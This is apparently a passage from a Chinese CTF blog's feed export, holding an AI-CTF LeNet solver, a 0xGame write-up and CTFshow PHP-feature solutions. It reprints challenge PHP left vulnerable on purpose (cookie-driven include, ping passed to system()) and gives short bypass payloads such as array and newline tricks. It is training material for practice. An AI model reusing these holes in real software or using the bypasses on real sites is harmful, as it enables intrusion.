<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(LeNet, self).__init__()</span><br><span class="line">        <span class="comment"># 定义卷积层和连接层</span></span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 定义全连接层</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 创建LeNet实例</span></span><br><span class="line">lenet_model = LeNet()</span><br><span class="line"><span class="comment"># 加载预训练的权重</span></span><br><span class="line">lenet_model.load_state_dict(pt)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line"><span class="comment"># 读取从0到56的.npy文件</span></span><br><span class="line">predicted_chars = []  <span class="comment"># 用于保存所有的预测字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):  <span class="comment"># 从0到56</span></span><br><span class="line">    npy_file_path = <span class="string">f&quot;./flag/<span class="subst">&#123;i&#125;</span>.npy&quot;</span></span><br><span class="line">    npy_data = np.load(npy_file_path).reshape((<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">    torch_input = torch.tensor(npy_data).<span class="built_in">float</span>()  <span class="comment"># 转换为PyTorch张量</span></span><br><span class="line">    <span class="comment"># 使用LeNet模型进行推理</span></span><br><span class="line">    output = lenet_model(torch_input)</span><br><span class="line">    <span class="comment"># 获取预测结果的索引</span></span><br><span class="line">    predicted_index = torch.argmax(output, dim=<span class="number">1</span>).item()</span><br><span class="line">    <span class="comment"># 根据索引获取对应的字符</span></span><br><span class="line">    predicted_char = chars[predicted_index]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Prediction for <span class="subst">&#123;npy_file_path&#125;</span>: <span class="subst">&#123;predicted_char&#125;</span>&quot;</span>)</span><br><span class="line">    predicted_chars.append(predicted_char)</span><br><span class="line"><span class="comment"># 将获取的字符串拼接起来</span></span><br><span class="line">result_string = <span class="string">&#x27;&#x27;</span>.join(predicted_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Concatenated Result:&quot;</span>, result_string)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
        <tag>AI</tag>
        <tag>LeNet</tag>
      </tags>
  </entry>
  <entry>
    <title>20230xGameWeek1-Writeup</title>
    <url>/2023/10/24/20230xGameWeek1-Writeup/</url>
    <content><![CDATA[<h1>20230xGameWeek1-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="Sign-In">Sign In</h3>
<p><strong>考点：f12</strong></p>
<p>f12查看源代码，在main.js中找到flag</p>
<p><img src="https://s2.loli.net/2023/10/19/8XbFGiRmQf6jdlk.png" alt=""></p>
<h3 id="baby-php">baby_php</h3>
<p><strong>考点：php特性利用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单来分析解读一下，首先时读取了两个get参数a和b，一个post参数c，以及一个cookie。</p>
<p>对于两个get参数a和b的要求时值不相等，但是md5相等，因此我们可以去了解一下MD5绕过，通过0e绕过即可过第一层。然后需要绕过is_numeric和intval。</p>
<p>在进行以上绕过之后，还需要对最后存在一个可控cookie参数name进行进一步的利用，通过php伪协议进行读取。</p>
<p><img src="https://s2.loli.net/2023/10/21/xp7u6a9TAWHh1zy.png" alt=""></p>
<p>然后将结果进行解码，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<h3 id="hello-http">hello_http</h3>
<p><strong>考点：http协议</strong></p>
<p>这题所考察的就是http相关知识</p>
<p>第一步是传入get参数，需要传一个/?query=ctf</p>
<img src="https://s2.loli.net/2023/10/21/LS35EKV8d9FARpv.png"  />
<p>第二步是传入post参数，action=getflag</p>
<p><img src="https://s2.loli.net/2023/10/21/LPm4GfCjn3X5KyQ.png" alt=""></p>
<p>第三步是改变身份认证，在cookie参数中写入role=admin</p>
<p><img src="https://s2.loli.net/2023/10/21/bhacRA5L9zNdr6H.png" alt=""></p>
<p>第四步是本地ip，相关参数有X-Forwarded-For，伪造127.0.0.1</p>
<p><img src="https://s2.loli.net/2023/10/21/w9nH8JUbxcCi4TZ.png" alt=""></p>
<p>第五步是User-Agent，中名为用户代理，可以进行伪造HarmonyOS Browser</p>
<p><img src="https://s2.loli.net/2023/10/21/gCNPT9rqOtJVB4o.png" alt=""></p>
<p>第六步是Referer 请求头包含了当前请求页面的来源页面的地址，<a href="http://xn--ys-jk3c39f.mihoyo.com">传入ys.mihoyo.com</a></p>
<p><img src="https://s2.loli.net/2023/10/21/RkzZV2cBXCnmjfx.png" alt=""></p>
<p>最终得到flag</p>
<p><img src="https://s2.loli.net/2023/10/21/eL257NWDcK8gAuI.png" alt=""></p>
<h3 id="repo-leak">repo_leak</h3>
<p><strong>考点：git泄露</strong></p>
<p>顾名思义，这是信息泄露相关。这里所考察的是git泄露</p>
<p>题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using Git for version control</span><br></pre></td></tr></table></figure>
<p>然后使用githack获取git源，使用命令查看并回退版本</p>
<p><img src="https://s2.loli.net/2023/10/23/WhFzge2GH9yrKcX.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/10/23/YaoVBvlz9761esZ.png" alt=""></p>
<p>最后在本地起一个http服务</p>
<p><img src="https://s2.loli.net/2023/10/23/gyjd9ZoVWkXhJ3v.png" alt=""></p>
<p>得到flag</p>
<p><img src="https://s2.loli.net/2023/10/23/AYNoBeOdJs4rDcF.png" alt=""></p>
<h3 id="ping">ping</h3>
<p><strong>考点：Bypass</strong></p>
<p>首先f12在源码中找到提示</p>
<p><img src="https://s2.loli.net/2023/10/23/oj6R4OdAN83pgCV.png" alt=""></p>
<p>打开api.php得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sanitize($s) &#123;</span><br><span class="line">    $s = str_replace(&#x27;;&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27; &#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;/&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;flag&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;ip&#x27;])) &#123;</span><br><span class="line">    die(&#x27;No IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;, $ip)) &#123;</span><br><span class="line">    die(&#x27;Invalid IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(&#x27;ping -c 4 &#x27;.$ip. &#x27; 2&gt;&amp;1&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里使用function封装了一个单元，将使用sanitize函数replace了一些字符</p>
<p>同时使用了preg_match 会匹配⼀个 IP 的正则表达式，需要绕过</p>
<p>前端做的部分限制，可以通过bp抓包绕过</p>
<p><img src="https://s2.loli.net/2023/10/23/4xbqaRCzc8r9vWA.png" alt=""></p>
<h3 id="相关知识点总结">相关知识点总结</h3>
<ol>
<li>F12查看源代码</li>
<li>md5绕过</li>
<li>is_numeric函数，intval() 函数绕过</li>
<li>php伪协议</li>
<li>http参数相关</li>
<li>git泄露</li>
</ol>
<h2 id="Misc">Misc</h2>
<h3 id="SignIn">SignIn</h3>
<p>两次编码转换</p>
<p><img src="https://s2.loli.net/2023/10/24/Pzn3UJwAL1iBgYl.png" alt=""></p>
<h3 id="重生之我在教学楼打cs">重生之我在教学楼打cs</h3>
<p>这题没意思，看看就行</p>
<h3 id="shark-shark">shark shark</h3>
<p>打开是一个流量包，仔细观察可以找到一个长度很大的tcp流</p>
<p><img src="https://s2.loli.net/2023/10/24/ndDvtlF7IgkQNsr.png" alt=""></p>
<p>追踪可以看到504B开头，明显是一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504b0304140009000800017e3b573440eb40380000002c00000008000000666c61672e74787474f54e6e559873f67e32d14b6572f12401b92b622d75b576fd8e73fcb0f080c8d232420e19a36ac5d6852ca66d16ba25b8727e2e42d21889504b07083440eb40380000002c000000504b01021f00140009000800017e3b573440eb40380000002c000000080024000000000000002000000000000000666c61672e7478740a00200000000000010018000d740af216f1d90156fc2fa417f1d90195872fa417f1d901504b050600000000010001005a0000006e0000000000</span><br></pre></td></tr></table></figure>
<p>十六进制导入010，得到压缩包，发现需要密码</p>
<p><img src="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png" alt="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png"></p>
<p>追踪其他tcp流得到密码</p>
<img src="https://s2.loli.net/2023/10/24/ioUgQ7XmBPlZIS8.png" style="zoom:67%;" />
<p>打开压缩包得到flag</p>
<img src="https://s2.loli.net/2023/10/24/w8zIivrHjVlmLN5.png" style="zoom:67%;" />
<h3 id="hide-and-seek">hide and seek</h3>
<p>使用stegseek弱口令爆破得到</p>
<p><img src="https://s2.loli.net/2023/10/26/M2oHPUlO9wqg4BZ.png" alt=""></p>
<h3 id="least-and-most">least and most</h3>
<p>分别使用了lsb（最低有效位）和msb（最高有效位）</p>
<h2 id="Reverse">Reverse</h2>
<h3 id="数字筑基">数字筑基</h3>
<p>这题考察的就是二进制转换为十六进制</p>
<p><img src="https://s2.loli.net/2023/10/23/bHcE4uajoyhAfGp.png" alt=""></p>
<h3 id="代码金丹">代码金丹</h3>
<p>用ida打开后，f5反编译得到flag</p>
<p><img src="https://s2.loli.net/2023/10/24/lNXt5HA74hDCI21.png" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>0xGame</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（1）总述</title>
    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
    <content><![CDATA[<h1>AI安全</h1>
<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
<p>这是引用的其中的一段话：</p>
<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
<p>学习心得及相关记录如下：</p>
<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
<p>AI相关CTF赛题：</p>
<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（3）network-in-network</title>
    <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
    <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
<p>本题来自2023HITCTF，这是赛后进行的复现</p>
<p>有被骂到，qwq~~</p>
<p><img src="https://s2.loli.net/2023/12/01/bB4Tfy8JHpP2Nd9.png" alt=""></p>
<p>首先来看问题代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line">m = trans(file)</span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>简单解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用 PIL 打开一张名为 ‘origin.jpg’ 的图像。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<p>创建一个图像转换操作的管道，将图像转换为 PyTorch 的张量（tensor）。<code>transforms.ToTensor()</code> 将图像转换为张量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = trans(file)</span><br></pre></td></tr></table></figure>
<p>通过上面的转换管道，将图像 ‘origin.jpg’ 转换为张量 <code>m</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br></pre></td></tr></table></figure>
<p>设置 PyTorch 的随机种子，以确保结果的可重复性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>构建一个简单的卷积神经网络（CNN）模型。该模型由以下层组成：</p>
<ul>
<li>一个卷积层 (<code>nn.Conv2d</code>)，输入通道数为 3，输出通道数为 5，卷积核大小为 3。</li>
<li>一个 ReLU 激活函数 (<code>nn.ReLU</code>)。</li>
<li>一个卷积层，输入通道数为 5，输出通道数为 10，卷积核大小为 5。</li>
<li>一个 ReLU 激活函数。</li>
<li>一个最大池化层 (<code>nn.MaxPool2d</code>)，池化窗口大小为 2。</li>
<li>一个全连接层 (<code>nn.Linear</code>)，输入特征数为 317，输出特征数为 800。</li>
<li>一个卷积层，输入通道数为 10，输出通道数为 1，卷积核大小为 1。</li>
<li>一个 Sigmoid 激活函数 (<code>nn.Sigmoid</code>)。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用模型对输入图像进行处理，将处理后的张量通过 <code>squeeze()</code> 去掉维度为 1 的尺寸，然后使用 <code>torchvision.utils.save_image</code> 将处理后的图像保存为 ‘enc.png’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>其实，这题的重点问题模型的输出逆推。首先，是前面卷积层卷积核小，仅捕捉局部细节特征，对整体图像不会有太大影响。其次，在全连接层，将十个通道进行了归一化处理，因此我们所能得到的仅是全连接层后被均值处理后的图像。</p>
<p>被困难卡住了，得弄明白回来补充</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-php特性</title>
    <url>/2024/03/19/CTFshow-php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1>CTFshow-php特性</h1>
<h2 id="web89">web89</h2>
<h3 id="源码">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>preg_match匹配到数组报错返回0，intval函数收到数组返回1，刚好满足条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num[]=0</span><br></pre></td></tr></table></figure>
<h2 id="web90">web90</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<h4 id="方法一">方法一</h4>
<p>小数直接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>使用进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure>
<h2 id="web91">web91</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>目的是进入第一个if，但绕过第二个，我们比较一下两个的区别是什么，可以发现多了一个<code>\m</code>多行匹配，因此我们的思路就是利用%0a是换行符进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=test%0aphp </span><br></pre></td></tr></table></figure>
<h2 id="web92">web92</h2>
<h3 id="源码-4">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span 